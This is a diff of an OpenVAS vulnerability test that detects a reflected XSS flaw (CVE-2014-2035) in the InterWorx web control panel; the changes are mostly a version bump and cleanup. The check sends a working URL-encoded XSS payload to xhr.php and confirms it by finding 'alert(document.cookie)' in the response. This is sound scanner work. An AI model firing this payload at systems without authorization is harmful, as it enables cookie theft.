@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_interworx_web_control_panel_mult_vuln.nasl 5827 2017-04-03 06:27:11Z cfi $
+# $Id: gb_interworx_web_control_panel_mult_vuln.nasl 11108 2018-08-24 14:27:07Z mmartin $
 #
 # InterWorx Web Control Panel Information Disclosure and XSS Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804779");
-  script_version("$Revision: 5827 $");
+  script_version("$Revision: 11108 $");
   script_cve_id("CVE-2014-2035");
   script_bugtraq_id(65734);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-03 08:27:11 +0200 (Mon, 03 Apr 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2014-10-16 18:28:59 +0530 (Thu, 16 Oct 2014)");
 
   script_tag(name:"solution_type", value:"VendorFix");
@@ -62,10 +62,10 @@ if(description)
   script_tag(name:"solution", value:"Update to version 5.0.13 build 574 or later,
   For updates refer http://www.interworx.com");
 
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/57063");
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/91443");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125344");
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/531191/100/0/threaded");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/57063");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/91443");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125344");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/531191/100/0/threaded");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
@@ -80,14 +80,8 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
-
 http_port = get_http_port(default:2443);
 
-## Iterate over possible paths
 foreach dir (make_list_unique("/", "/nodeworx", "/interworx", cgi_dirs(port:2443)))
 {
 
@@ -95,10 +89,8 @@ foreach dir (make_list_unique("/", "/nodeworx", "/interworx", cgi_dirs(port:2443
 
   rcvRes = http_get_cache(item: string(dir, "/"),  port:http_port);
 
-  ## confirm the Application
   if("InterWorx-CP" >< rcvRes)
   {
-    ## Construct attack request
     url = dir + '/xhr.php?i=%7B%22r%22%3A%22Form_InputValidator%22%2C%22i%22%3A%7B'
               + '%22form%22%3A%22Form_NW_Shell_ForbiddenUsers%22%2C%22ctrl%22%3A%2'
               + '2%5C%2Fnodeworx%5C%2Fshell%3Cimg%20src%3Dx%20onerror%3Dalert(docu'
@@ -109,7 +101,6 @@ foreach dir (make_list_unique("/", "/nodeworx", "/interworx", cgi_dirs(port:2443
     sndReq = http_get(item:url, port:http_port);
     rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-    ## Confirm the exploit, Extra check not possible
     if(rcvRes =~ "HTTP/1\.. 200" && "Onerror=alert(document.cookie)" >< rcvRes)
     {
       security_message(port:http_port);
